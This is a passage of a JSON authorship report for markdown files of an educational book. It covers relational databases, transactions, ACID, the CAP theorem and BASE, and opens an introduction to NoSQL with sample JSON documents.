        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "- [MongoDB](https://www.mongodb.com/) (document-oriented)"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "- [MySQL](https://www.mysql.com/) (relational)"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "- [PostgreSQL](https://www.postgresql.org/) (relational)"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "- [ArrangoDB](https://www.arangodb.com/) (document, graph, key-value - multi-model)"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "- [Redis](https://redis.io/) (key-value database)"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "## Relations"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "The most popular database model, relational model, makes use of relations. This model assumes that the data to be stored follow a certain \u0027pattern\u0027. For instance, a database that stores products sold by a shop would contain data such as: name, description, price and current stock levels. A visualisation of the database and data can be seen below:"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "| Name  | Description                  | Price | Current Stock |"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "|:-----:|:----------------------------:|:-----:|:-------------:|"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "| Fruit | A fruit.                     | 1.00  |      100      |"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "| Bread | Sliced for your convenience. | 1.40  |       50      |"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "| Water | Essential for life.          | 0.50  |     1000      |"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "From this visualisation, we can define the different parts of the relation:"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "- The whole table is known as a **relation**."
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "- Each data row (i.e. excluding the header row) is known as a **tuple**, for instance: (Fruit, A fruit., 1.00, 100)."
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "- Each column is an **attribute** and each attribute has a **domain** or **data type**. The *Current Stock* column of the table is an attribute with a data type of integer (as product stock is logically represented using an integer)."
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "- Each element in a tuple is called an **attribute value**"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "[Click here](https://en.wikipedia.org/wiki/Relation_(database)) for a more in-depth and formal definition of relations."
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "## Transactions"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "Databases are useless if the data cannot be used in a meaningful manner. However, uncontrolled access to the database would not be ideal, as it might cause problems, especially when other actions may depend on the previous action\u0027s result."
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "Take for instance, a program that transfers money from one bank account to another. The actions that the program would need to do involves:"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "1. Checking if the sender has enough money"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "2. Deducting the amount of money to be sent"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "3. Adding that amount to the receiver\u0027s account"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "A problem arises if another action takes place in between any of the steps (e.g. another transfer from the same sender), or if any of the steps fails (e.g. due to a program crash). As a result, it may cause the data to be manipulated in an undesired manner (e.g. money not credited to receiver)."
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "Thus, **transactions** allow us to guard against these problems. A **transaction** symbolises a logical unit of work, which consists of multiple database actions, performed on a set of databases. [[Source]](https://en.wikipedia.org/wiki/Database_transaction) Properties of a database transaction ensures that these actions are done in a predictable (i.e. in the particular order) and reliable (i.e. all actions must be performed correctly) manner."
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "Thus, the transaction that would be implemented in the program could be something like this:"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "1. Perform funds transfer from *sender* to *receiver*"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "    - Checking if the sender has enough money"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "    - Deducting the amount of money to be sent"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "    - Adding that amount to the receiver\u0027s account"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "As demonstrated above, the actions that needs to be done in order to transfer funds is wrapped as one large **transaction**. Hence, the *funds transfer* can be seen as the unit of work to be done on the database. The actions that make up the **transaction** are executed as though **transaction** is a single action."
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### ACID in Transactions"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "For a **transaction** to be considered as an implementation of the **transaction** concept, it has to satisfy the ACID principle."
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "This principle states that a **transaction** must contain these characteristics:"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "- Atomicity - transactions only succeed if all parts of the transaction succeeds. That is to say, if any action fails, the transaction fails and the state of the database should be left unchanged (i.e. as if the transaction did not happen)"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "- Consistency - transactions must ensure that the database remains in a valid state after the transaction (for instance, all relations hold true)"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "- Isolation - if multiple transactions runs at the same time, the result should be the same as though these transactions are run sequentially"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "- Durability - transactions and its results should remain persistent (i.e. power loss or reboot should not affect results)"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "## Distributed Databases"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "The above section demonstrates how data can be related to each other. However, this demonstration assumes one thing: there is only one record of the data that is stored. What if there is a need to scale the database in such a way that the data is distributed across several servers?"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "Relational model DBMSes usually do not scale as well, as the **ACID principle**, more specifically, durability, forces the database to propagate any changes to the data across all servers. One famous theorem, the **CAP theorem**, states the a distributed computer system can only fulfil two out of three guarantees."
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "|      Guarantee      |                          Description                         |"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "|:-------------------:|:------------------------------------------------------------:|"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "| Consistency         |               Read should receive latest write               |"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "| Availability        |         Every request receives a response (non-error)        |"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "| Partition tolerance | System works even though there are some communication errors |"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": "A relational model DBMS trades off availability for consistency. As the changes are propagated across the network, subsequent requests might be dropped by the DBMS as the current state of the database violates ACID."
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "However, in other DBMSes, like MongoDB, consistency is the trade off. This allows the database system to scale up to multiple nodes, as all requests are served, but the requests may result in incorrect or out of date data."
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "As such, these DBMSes follow the **BASE philosophy**:"
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "- Basically Available - data is guaranteed available, but data may not be retrieved correctly (i.e. unable to retrieve or incorrect/out of date data)"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "- Soft state - state of system changes even though there might not be any user input, as it needs to ensure \u0027eventual consistency\u0027"
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "- Eventual consistency - the consistency of the system eventually occurs, but changes to data are still accepted in the meantime"
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": "## Database Abstractions and Languages"
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": "### Relational Algebra"
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": "A formal method of modelling the relations that have been demonstrated in this chapter is through the use of **relational algebra**. This is a formal method for modelling the data and actions performed on a relational database."
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Further Exploration"
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": "- [Relational algebra](https://www.tutorialspoint.com/dbms/relational_algebra.htm)"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "### Query Language and Abstractions"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": "We have seen how databases are structured and how the underlying DBMS ensures that a certain set of characteristics, with regards to the system, hold true."
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": "Now, the data consumer (for instance, an application or an actual human) would preferably want to access the data in a manner that is not DBMS specific. The DBMS implementation should have very little effect on the actual method of accessing the data. If there\u0027s a need to switch over to a different DBMS that has the same set of features as the previous DBMS, the application should preferably not have to change its method of accessing the data."
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": "**Query languages** solves that issue, as some of them are designed to be platform-independent. As such, the query language can be seen as an abstraction of the possible actions that can be performed on a specific set of DBMSes. However, be forewarned that query languages are not totally platform-independent, as certain DBMSes may implement features that are unique to the certain DBMS."
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": "Take for instance SQL, which is one of the most popular query languages for relational DBMSes. While most features in the language are supported by relational DBMSes that uses SQL, certain features, for instance `SAMPLE` (which allows the consumer to pick a random set of data) are not available on all of the DBMses that supports SQL."
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": "Another level of abstraction is the **database abstraction layer**. This is usually an API level solution, as the programmer does not even need to know about a specific query language. Some abstractions are DBMS agnostic and as such, can be used to access data from any kind of DBMS, regardless of its features."
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": "#### Further exploration"
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": "##### Query languages"
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": "- [SQL](https://www.w3schools.com/sql/)"
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": "- [XPath](https://www.w3schools.com/xml/xpath_intro.asp)"
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": "##### Database abstractions"
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": "- [PHP Data Objects](https://secure.php.net/manual/en/book.pdo.php)"
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": "- [Object-relational mapping](https://en.wikipedia.org/wiki/Object-relational_mapping)"
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 6,
      "iskandarzulkarnaien": 16,
      "-": 172
    }
  },
  {
    "path": "contents/data/nosql/NoSQL.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  title: Introduction to NoSQL"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "# Introduction to NoSQL"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "**Author(s): [Ang Ze Yu](https://github.com/ang-zeyu)**"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "**Reviewer(s): [Neil Brian](https://github.com/nbriannl), [James Pang](https://github.com/jamessspanggg), [Daryl Tan](https://github.com/openorclose), [Yash Chowdhary](https://github.com/yash-chowdhary)**"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cbox type\u003d\"info\"\u003e"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Basic knowledge of relational databases is assumed. If not, give the \u003ca href\u003d\"../sql/SQL.html\"\u003eSQL article\u003c/a\u003e a read first!"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cbox id\u003d\"article-toc\" style\u003d\"background-color: #dee2e62b\"\u003e"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "##### Table of contents { .no-index .border-bottom .pb-1 }"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "* [What is NoSQL‎](#what-is-nosql)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "* [Key Characteristics of NoSQL Databases](#key-characteristics-of-nosql-databases)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  * [Powerful and Simple CRUD Operations](#1-powerful-and-simple-crud-operations)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  * [Schema-Less Data](#2-schema-less-data)"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  * [Straightforward Expression of Relations in Data](#3-straightforward-expression-of-relations-in-data)"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "* [Why NoSQL](#why-nosql)"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  * [1. Highly Suited for Iterated Development](#1-highly-suited-for-iterated-development)"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  * [2. Easy Horizontal Scaling](#2-easy-horizontal-scaling)"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  * [3. Widespread Adoption](#3-widespread-adoption)"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "* [Caveats of NoSQL‎](#caveats-of-nosql)"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  * [Lack of Standardisation](#1-lack-of-standardisation)"
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  * [Not Suited for Complex Relational Queries‎](#2-not-suited-for-complex-relational-queries)  "
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "* [How to get Started With NoSQL?‎](#how-to-get-started-with-nosql)"
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "{.px-3}"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "---"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "## What is NoSQL?"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "**Non-Structured Query Language** \u003ctooltip content\u003d\"Some other common interpretations include \u0027not only SQL\u0027, \u0027non relational\u0027, \u0027no SQL\u0027\"\u003e(**NoSQL**)\u003c/tooltip\u003e is a wide set of implementations of query technologies used to retrieve and store data in a non-tabular format."
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "For example, here is one such data item - a book in the catalogue of an e-commerce website, represented in a"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cpopover effect\u003d\"fade\" header\u003d\"Javascript Object Notation\" content\u003d\"A commonly used data format which represents data in a simple, human and machine-readable format.\" placement\u003d\"top\"\u003eJSON\u003c/popover\u003e"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "format."
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": " "
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "```js"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "{"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  type: \"book\","
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  price: 20,"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  popularity: 9.7,"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "}"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "```"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "To start, let\u0027s jump into the most common implementation of such databases, _document databases_.\u003cbr\u003e"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "One such commonly used database is MongoDB, which is a document based database."
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cbox type\u003d\"info\" light\u003e"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cli\u003eOther types of NoSQL databases, such as \u003ctrigger for\u003d\"key-value-db\"\u003ekey-value databases\u003c/trigger\u003e,"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003ctrigger for\u003d\"graph-db\"\u003egraph databases\u003c/trigger\u003e, can be viewed as extensions or reductions of document based databases."
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/li\u003e"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cli\u003eSome of these types can even be used together!\u003c/li\u003e"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cimg src\u003d\"documentDatabaseStructure.png\" width\u003d\"75%\" class\u003d\"mx-auto mb-2 d-block\"/\u003e"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "In contrast to tables and table entries in relational databases, document databases comprise of multiple collections, which in turn consists of multiple documents."
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "In a simplified e-commerce website for example, you may have the following collections: { id\u003d\"main-example\" }"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "- _customers_ - storing the account details of customers, their purchase histories, etc."
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "- _items_ - a collection of all items available for purchase (which are documents)"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "- _admin_ - a collection storing admin account details"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "- **...**"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "In this case, the _items_ collection which contains the catalogue of purchase items may be structured like so:"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cdiv id\u003d\"schemaless-example\"\u003e"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "```js"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "["
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  {"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "    type: \"book\","
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "    title: \"about pandas\","
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "    price: 20,"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "    popularity: 9.7,"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "    author: \"panda1\","
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "    ..."
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  },"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  {"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "    type: \"grocery\","
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "    name: \"cheese\","
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "    brand: \"panda\","
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  },"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  ..."
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "]"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "```"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/div\u003e"
      },
      {
        "lineNumber": 109,
